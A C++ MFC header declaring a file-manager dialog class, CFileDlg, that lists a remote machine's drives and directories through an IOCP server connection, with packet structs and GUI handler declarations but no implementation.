#pragma once

#include "IOCPServer.h"
#include "afxwin.h"
#include "afxcmn.h"
// CFileDlg 对话框
typedef struct _DRIVE_LIST
{
	BYTE		bToken;
	wchar_t		DriveString[256];

}DRIVE_LIST;
typedef struct _FILE_DATA
{
	BYTE		bToken;
	BYTE		pData[8196];
	_FILE_DATA()
	{
		bToken = NULL;
		memset(pData,0,8196);
	}
}FILE_DATA;
class CFileDlg : public CDialogEx
{
	DECLARE_DYNAMIC(CFileDlg)

public:
	CFileDlg(CIOCPServer* iocpServer,CWnd* pParent = NULL);   // 标准构造函数
	virtual ~CFileDlg();

// 对话框数据
	enum { IDD = IDD_FLIE };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持
	DECLARE_MESSAGE_MAP()

public:
	afx_msg void OnSize(UINT nType, int cx, int cy);
	virtual BOOL OnInitDialog();
	void Start(CIOCPServer* pServer,void* pClient);
	void OnReceiveComplete();
	afx_msg void OnCbnSelchangeCombo2();
public:
	CIOCPServer*		m_iocpServer;
	ClientContext*		m_Context;
	CComboBox			m_diskList;
	CTreeCtrl			m_dic;
	CListCtrl			m_fileList;
	BYTE				m_bRemoteDriveList[1024];
	CString				m_Remote_Path;
	CEdit				m_crtDic;
	CButton				m_backButton;
	CButton				m_freshButton;
public:
	void ReceiveRemoteDriveList();
	void ReceiveRemoteFileList();
	afx_msg void OnTvnSelchangedTree1(NMHDR *pNMHDR, LRESULT *pResult);

	afx_msg void OnBnClickedBack();
	afx_msg void OnBnClickedFresh();
	void GetRemoteFileList(CString directory);
	CString GetParentDirectory(CString strPath);
};
